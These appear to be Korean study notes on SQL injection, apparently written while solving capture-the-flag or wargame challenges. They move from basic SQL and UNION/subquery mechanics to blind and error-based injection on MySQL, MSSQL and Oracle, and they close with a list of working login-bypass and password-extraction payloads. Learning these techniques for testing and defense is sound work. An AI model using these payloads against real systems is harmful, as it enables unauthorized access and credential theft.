***기본 쿼리 예약어***
	select	조회 명령어
	from	조회할 테이블 이름
	where	조회 조건
	order by(ASC\DESC)	결과를 컬럼 기준 정렬
	limit	행의 개수와 오프셋 설정
	group by	몰라도됨
	like	=

	그외 DML은 sql관련팁 확인



***UNION SELECT***
	다수의 SELECT 구문의 결과를 결합하는 절
	이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 함
	특정 DBMS에서는 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입이 같아야 함

		SELECT * FROM UserTable UNION SELECT "admin", "pw";



***Subquery***
	한 쿼리 내에 또 다른 쿼리를 사용하는 것
	쿼리 내에서 괄호 안에 구문을 삽입해야 함

		SELECT 1,2,3,(SELECT 456);

	컬럼 절에서 서브 쿼리를 사용할 때에는 
	단일 행 (Single Row)과 단일 컬럼(Single Column)이 반환되도록 해야 함

		mysql> SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
		ERROR 1242 (21000): Subquery returns more than 1 row

	FROM 절에서 사용하는 서브 쿼리를 인라인 뷰 (Inline View)
	다중 행 (Multiple Row)과 다중 컬럼 (Multiple Column) 결과를 반환할 수 있음

		SELECT * FROM (SELECT *, 1234 FROM users) as u;
		+----------+------+
		| username | 1234 |
		+----------+------+
		| admin    | 1234 |
		| guest    | 1234 |
		+----------+------+
		2 rows in set (0.00 sec)

	WHERE 절에서 서브 쿼리를 사용하면 다중 행 결과를 반환하는 쿼리문을 실행할 수 있음

		mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
		/*
		+----------+----------+
		| username | password |
		+----------+----------+
		| admin    | admin    |
		| guest    | guest    |
		+----------+----------+
		2 rows in set (0.00 sec)
		*/



***Application Logic***
	UNION을 사용한 공격
		UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있음

			/?username=' union select 'admin' -- -
			==> True

	substring과 length을 사용한 공격
		원하는 데이터의 길이를 구하고, 비교를 통해 참거짓 반환

			/?username=' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -
			==> False
			/?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -
			==> True
			/?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
			==> True



***더 효율적인 공격 쿼리***
	Binary Search(이진탐색)
		아스키에서 출력 가능한 문자의 범위는 32~126
		패스워드의 첫 번째 바이트가 79보다 큰 값인지 확인
		
			mysql> select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
			+----------+----------+
			| username | password |
			+----------+----------+
			| admin    | P@ssword |
			+----------+----------+
			1 row in set (0.00 sec)

	Bit 연산
	ASCII는 0부터 127 범위의 문자를 표현할 수 있고,
	이는 곧 7 개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미
	 MySQL에서는 숫자를 비트 형태로 변환하는 bin이라는 함수를 제공

		mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
		+----------+----------+
		| username | password |
		+----------+----------+
		| admin    | P@ssword |
		+----------+----------+
		1 row in set (0.00 sec)
		mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
		Empty set (0.00 sec)


***Error based SQL Injection***
	애플리케이션에서 발생하는 에러를 이용해 공격
	문법 에러와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌 
	런타임 (Runtime) 즉, 쿼리가 실행되고나서 발생하는 에러가 필요

		SELECT extractvalue(1,concat(0x3a,version()));
		/*
		ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
		*/

	extractvalue 함수는 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출
	만약, 두 번째 인자가 올바르지 않은 XPATH 식일 경우 
	올바르지 않은 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력

		mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
		+-----------------------------------------------+
		| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
		+-----------------------------------------------+
		| test                                          |
		+-----------------------------------------------+
		1 row in set (0.00 sec)

		mysql> SELECT extractvalue(1, ':abcd');
		ERROR 1105 (HY000): XPATH syntax error: ':abcd'
		# ":" 로 시작하면 올바르지 않은 XPATH 식

	해당 함수를 이용해 데이터베이스의 정보를 추출할 수 있다.
	concat를 통해 데이터 앞에 0x3a(:) 붙이는 이유는 의도적으로 실행 중에 오류를 일으키기 위함이다.

		mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
		ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'

	다음은 DBMS별로 Error based SQLI를 통해 공격하는 방법이다.

		MySQL
		Figure 7. MySQL Error based SQLI 응용 예시 - 1

		SELECT updatexml(null,concat(0x0a,version()),null);
		/*
		ERROR 1105 (HY000): XPATH syntax error: '
		5.7.29-0ubuntu0.16.04.1-log'
		*/


		Figure 8. MySQL Error based SQLI 응용 예시 - 2

		SELECT extractvalue(1,concat(0x3a,version()));
		/*
		ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
		*/


		Figure 9. MySQL Error based SQLI 응용 예시 - 3

		SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
		/*
		ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
		*/
		MSSQL
		Figure 10. MSSQL Error based SQLI 응용 예시 - 1

		SELECT convert(int,@@version);
		SELECT cast((SELECT @@version) as int);
		/*
		Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
			Feb 20 2014 19:20:46 
			Copyright (c) Microsoft Corporation
			Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
		' to data type int.
		*/
		Oracle
		Figure 11. Oracle Error based SQLI 응용 예시 - 1

		SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
		/*
		ORA-20000: Oracle Text error:
		DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
		ORA-06512: at "CTXSYS.DRUE", line 183
		ORA-06512: at "CTXSYS.DRITHSX", line 555
		ORA-06512: at line 1
		*/



***성공 쿼리 모음***
	로그인 성공
		admin"--
		" or 1--

	flag 얻기 성공
		" union select userpassword,1 from users where userid="admin" or "
		" union select userpassword,1 from users where userid="admin"--

	flag 일부정보 얻기 성공
		' union select length(password)=10 from users where username='admin' -- -
		' union select substr(password,1,1)='B' from users where username='admin' -- -
		' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -

